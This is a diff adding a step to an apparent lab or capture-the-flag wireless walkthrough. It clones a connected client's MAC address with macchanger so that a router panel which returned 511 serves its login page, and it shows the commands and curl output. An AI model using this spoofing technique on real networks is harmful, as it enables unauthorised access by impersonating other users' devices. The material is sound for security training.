@@ -135,3 +135,31 @@ user@debian-thm:~$ sudo airodump-ng -c 6 --bssid F0:9F:C2:71:22:10 wlan0mon
  F0:9F:C2:71:22:10  B0:72:BF:B0:78:48  -44   0 - 1      0      12
  F0:9F:C2:71:22:10  B0:72:BF:44:B0:49  -47   0 - 1      0       8
 ```
+
+Clone the first of those addresses onto wlan2. macchanger rewrites the address a card presents to the network, with -m supplying the one to adopt. The driver accepts the change only while the interface is down, so it is taken down first and brought back up once the new address is in place:  
+
+```console
+user@debian-thm:~$ sudo ip link set wlan2 down
+user@debian-thm:~$ sudo macchanger -m 80:18:44:BF:72:47 wlan2
+Current MAC:   02:00:00:00:02:00 (unknown)
+Permanent MAC: 02:00:00:00:02:00 (unknown)
+New MAC:       80:18:44:bf:72:47 (unknown)
+user@debian-thm:~$ sudo ip link set wlan2 up
+```
+
+Reconnect by rerunning wpa_supplicant and dhclient, then issue the identical request. The same URL that returned 511 now returns a redirect to the panel's login page:  
+
+```console
+user@debian-thm:~$ curl -sI http://192.168.10.1/
+HTTP/1.1 302 Found
+Date: Sat, 04 Jul 2026 14:43:07 GMT
+Server: Apache/2.4.66 (Debian)
+Set-Cookie: PHPSESSID=REDACTED; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+location: login.php
+Content-Type: text/html; charset=UTF-8
+```
+
+<img width="2124" height="918" alt="image" src="https://github.com/user-attachments/assets/57a02755-212f-4387-b52b-d05156f09b8a" />
